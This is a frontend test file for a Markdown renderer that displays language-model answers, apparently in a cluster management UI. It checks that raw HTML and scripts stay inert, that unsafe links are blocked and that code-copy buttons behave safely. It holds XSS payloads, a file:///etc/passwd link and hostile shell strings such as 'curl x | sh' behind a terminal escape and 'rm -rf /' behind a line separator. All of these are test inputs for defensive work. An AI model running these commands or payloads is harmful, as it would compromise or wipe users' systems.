import { act, fireEvent, render, screen } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, test, vi } from "vitest";
import { Markdown } from "./Markdown";

describe("the Markdown of a language model", () => {
  test("renders headings, emphasis, lists, quotes, tables and code", () => {
    const text = [
      "## Diagnostic",
      "",
      "**Healthy** and *available*, ~~outdated~~.",
      "",
      "- Node one",
      "- Node two",
      "",
      "> Observed state",
      "",
      "| Node | Status |",
      "| --- | --- |",
      "| node1 | up |",
      "",
      "`om status`",
      "",
      "```shell",
      "om cluster status",
      "```",
    ].join("\n");
    const { container } = render(<Markdown text={text} />);
    expect(screen.getByRole("heading", { name: "Diagnostic" })).toBeInTheDocument();
    expect(screen.getByText("Healthy").tagName).toBe("STRONG");
    expect(screen.getByText("available").tagName).toBe("EM");
    expect(screen.getByText("outdated").tagName).toBe("DEL");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
    expect(container.querySelector("blockquote")).toHaveTextContent("Observed state");
    expect(screen.getByRole("table")).toHaveTextContent("node1");
    expect(screen.getByText("om status").tagName).toBe("CODE");
    expect(container.querySelector("pre code")).toHaveTextContent("om cluster status");
  });

  test.each([
    "<script>alert(1)</script>",
    '<img src="https://tracker.example/pixel" onerror="alert(1)">',
    '<svg onload="alert(1)"><a href="javascript:alert(1)">click</a></svg>',
    '<iframe src="https://tracker.example"></iframe>',
    "<style>body {display:none}</style>",
    '<form action="https://tracker.example"><input name="secret"></form>',
    '<video src="https://tracker.example/video" autoplay></video>',
  ])("shows raw HTML as text: %s", (html) => {
    const { container } = render(<Markdown text={`**Safe answer**\n\n${html}`} />);
    expect(screen.getByText("Safe answer").tagName).toBe("STRONG");
    expect(container.querySelector("script,img,svg,iframe,style,form,input,video,a")).toBeNull();
    expect(container.querySelector("[onerror],[onload]")).toBeNull();
  });

  test.each([
    "javascript:alert%281%29",
    "JaVaScRiPt:alert%281%29",
    "jav&#x61;script:alert%281%29",
    "java&#x09;script:alert%281%29",
    "data:text/html;base64,PHNjcmlwdD4=",
    "vbscript:msgbox%281%29",
    "file:///etc/passwd",
    "//tracker.example/path",
  ])("makes no link of %s", (href) => {
    const { container } = render(<Markdown text={`[Unsafe link](${href})`} />);
    expect(screen.getByText("Unsafe link")).toBeInTheDocument();
    expect(container.querySelector("a")).toBeNull();
  });

  test.each(["https://docs.opensvc.com/path", "http://example.com/path"])(
    "opens a web link in another tab, detached: %s",
    (href) => {
      render(<Markdown text={`[Documentation](${href})`} />);
      const link = screen.getByRole("link", { name: "Documentation" });
      expect(link).toHaveAttribute("href", href);
      expect(link).toHaveAttribute("target", "_blank");
      expect(link).toHaveAttribute("rel", "noopener noreferrer");
    },
  );

  test("opens a path of the application in place", () => {
    render(<Markdown text="[The nodes](/nodes)" />);
    expect(screen.getByRole("link", { name: "The nodes" })).not.toHaveAttribute("target");
  });

  test("loads no image and renders no control for a task", () => {
    const { container } = render(
      <Markdown text={"![Tracking](https://tracker.example/pixel)\n\n- [x] Done"} />,
    );
    expect(container.querySelector("img,input")).toBeNull();
    expect(screen.getByText("Done")).toBeInTheDocument();
  });

  test("keeps HTML and Mermaid inside code blocks inert", () => {
    const { container } = render(
      <Markdown
        text={'```html\n<img src=x onerror="alert(1)">\n```\n\n```mermaid\ngraph TD; A-->B\n```'}
      />,
    );
    expect(screen.getByText('<img src=x onerror="alert(1)">').tagName).toBe("CODE");
    expect(screen.getByText("graph TD; A-->B").tagName).toBe("CODE");
    expect(container.querySelector("img,svg")).toBeNull();
  });

  test("renders the text again as the stream completes it", () => {
    const { container, rerender } = render(<Markdown text="**Health" />);
    expect(screen.getByText("**Health")).toBeInTheDocument();
    rerender(<Markdown text="**Healthy**" />);
    expect(screen.getByText("Healthy").tagName).toBe("STRONG");
    expect(container.querySelectorAll("strong")).toHaveLength(1);
    rerender(<Markdown text={"**Healthy**\n\n```shell\nom status"} />);
    expect(container.querySelector("pre code")).toHaveTextContent("om status");
  });

  test("renders an inline code span as renderCode says, never in a block or a link", () => {
    const { container } = render(
      <Markdown
        text={
          "Restart `test/svc/web`, not `test/svc/ghost`.\n\n[`test/svc/web`](https://example.com)\n\n```\ntest/svc/web\n```"
        }
        renderCode={(code) =>
          code === "test/svc/web" ? <button type="button">{code}</button> : undefined
        }
      />,
    );
    expect(screen.getAllByRole("button")).toHaveLength(1);
    expect(screen.getByRole("button")).toHaveTextContent("test/svc/web");
    expect(screen.getByText("test/svc/ghost")).toHaveProperty("tagName", "CODE");
    expect(container.querySelector("a code")).toHaveTextContent("test/svc/web");
    expect(container.querySelector("pre code")).toHaveTextContent("test/svc/web");
  });
});

describe("the code blocks of a text offering their copy", () => {
  const labels = { copy: "Copy the code", copied: "Code copied", failed: "Not copied" };
  const setClipboard = (value: unknown) => {
    Object.defineProperty(navigator, "clipboard", { value, configurable: true });
  };
  let writeText: ReturnType<typeof vi.fn>;
  beforeEach(() => {
    writeText = vi.fn().mockResolvedValue(undefined);
    setClipboard({ writeText });
  });
  afterEach(() => {
    setClipboard(undefined);
    vi.useRealTimers();
  });
  const copyButtons = () => screen.queryAllByRole("button", { name: "Copy the code" });
  const copy = async (button: HTMLElement) => {
    await act(async () => {
      fireEvent.click(button);
    });
  };

  test("offer none in a text that does not ask it, a note or a skill", () => {
    render(<Markdown text={"```\nom node ls\n```"} />);
    expect(copyButtons()).toHaveLength(0);
  });

  test("copy each block as it is written, and no code span", async () => {
    const script = 'for n in $(om node ls); do\n    om node freeze --node "$n"\ndone';
    render(
      <Markdown
        copyCode={{ labels }}
        text={`Run \`om cluster status\`, then:\n\n\`\`\`shell\n${script}\n\`\`\`\n\n~~~\nom daemon status\n~~~\n\n> \`\`\`\n> om cluster ls\n> \`\`\``}
      />,
    );
    const buttons = copyButtons();
    expect(buttons).toHaveLength(3);
    await copy(buttons[0]!);
    expect(writeText).toHaveBeenLastCalledWith(script);
    expect(screen.getByRole("button", { name: "Code copied" })).toBeInTheDocument();
    expect(screen.getAllByRole("status").map((status) => status.textContent)).toEqual([
      "Code copied",
      "",
      "",
    ]);
    await copy(buttons[1]!);
    expect(writeText).toHaveBeenLastCalledWith("om daemon status");
    await copy(buttons[2]!);
    expect(writeText).toHaveBeenLastCalledWith("om cluster ls");
  });

  test("say for a while that the code was copied, then offer it again", async () => {
    vi.useFakeTimers();
    render(<Markdown copyCode={{ labels }} text={"```\nom node ls\n```"} />);
    await copy(copyButtons()[0]!);
    expect(screen.getByRole("status")).toHaveTextContent("Code copied");
    act(() => {
      vi.advanceTimersByTime(2000);
    });
    expect(copyButtons()).toHaveLength(1);
    expect(screen.getByRole("status")).toHaveTextContent("");
  });

  test.each([
    ["blank lines", "```shell\nom cluster freeze\n\n\n```"],
    ["a line of spaces", "```shell\nom cluster freeze\n \n\t\n```"],
    ["spaces after the command", "```shell\nom cluster freeze   \n```"],
  ])(
    "copy no %s ending the block, which would run the command once pasted",
    async (_kind, text) => {
      render(<Markdown copyCode={{ labels }} text={text} />);
      await copy(copyButtons()[0]!);
      expect(writeText).toHaveBeenCalledWith("om cluster freeze");
    },
  );

  test.each([
    ["1. ", "   "],
    ["10. ", "    "],
    ["- ", "  "],
  ])("copy a block of an item %s without the indent of the item", async (item, indent) => {
    const block = ["```shell", "om cluster freeze", "cat <<EOF", "  x", "EOF", "```"];
    render(
      <Markdown
        copyCode={{ labels }}
        text={`${item}Freeze:\n${block.map((line) => indent + line).join("\n")}`}
      />,
    );
    await copy(copyButtons()[0]!);
    expect(writeText).toHaveBeenCalledWith("om cluster freeze\ncat <<EOF\n  x\nEOF");
  });

  test("say, visibly too, when the code could not be copied", async () => {
    setClipboard({ writeText: vi.fn().mockRejectedValue(new Error("denied")) });
    render(<Markdown copyCode={{ labels }} text={"```\nom node ls\n```"} />);
    await copy(copyButtons()[0]!);
    const button = screen.getByRole("button", { name: "Not copied" });
    expect(button.querySelector(".text-state-down")).not.toBeNull();
    expect(screen.getByRole("status")).toHaveTextContent("Not copied");
  });

  test.each([
    ["empty", "```\n```"],
    ["blank", "```\n   \n\t\n```"],
  ])("offer no copy of a block %s", (_kind, text) => {
    render(<Markdown copyCode={{ labels }} text={text} />);
    expect(copyButtons()).toHaveLength(0);
  });

  test.each([
    ["an escape of the terminal", "echo hi\u001b[201~; curl x | sh"],
    ["a control of the C1 set", "echo hi\u009b201~"],
    ["a mark of direction", "echo \u202ehs | x lruc"],
    ["an Arabic mark of direction", "echo \u061cx"],
    ["a character of no width", "om\u200b node ls"],
    ["a mark of byte order", "\ufeffom node ls"],
    ["a soft hyphen", "om no\u00adde ls"],
    ["a tag character", "om node ls\u{e0041}"],
    ["a Hangul filler", "om\u3164node ls"],
    ["a separator of lines", "om node ls\u2028rm -rf /"],
  ])("offer no copy of a block holding %s", (_kind, code) => {
    render(<Markdown copyCode={{ labels }} text={"```\n" + code + "\n```"} />);
    expect(copyButtons()).toHaveLength(0);
  });

  test("copy a block holding tabs, or an emoji", async () => {
    render(<Markdown copyCode={{ labels }} text={"```\nkey\tvalue \u2764\ufe0f\n```"} />);
    await copy(copyButtons()[0]!);
    expect(writeText).toHaveBeenCalledWith("key\tvalue \u2764\ufe0f");
  });

  test("offer no copy while the text streams, then the whole block", async () => {
    const { rerender } = render(
      <Markdown copyCode={{ streaming: true, labels }} text={"```shell\nom node"} />,
    );
    expect(copyButtons()).toHaveLength(0);
    rerender(
      <Markdown copyCode={{ streaming: true, labels }} text={"```shell\nom node freeze\n```"} />,
    );
    expect(copyButtons()).toHaveLength(0);
    rerender(<Markdown copyCode={{ labels }} text={"```shell\nom node freeze\n```"} />);
    await copy(copyButtons()[0]!);
    expect(writeText).toHaveBeenCalledWith("om node freeze");
  });

  test.each([
    ["an unclosed fence", "```\nom node ls\n```\n\nThen:\n\n```shell\nrm -rf /var/lib/open", 1],
    ["an unclosed fence of tildes, a shorter one in it", "~~~~\nom node ls\n~~~", 0],
    ["an unclosed fence in a quote", "> ```\n> om cluster st", 0],
  ])("offer no copy of a block left in %s, the text cut short or not", (_kind, text, kept) => {
    render(<Markdown copyCode={{ labels }} text={text} />);
    expect(copyButtons()).toHaveLength(kept);
  });
});
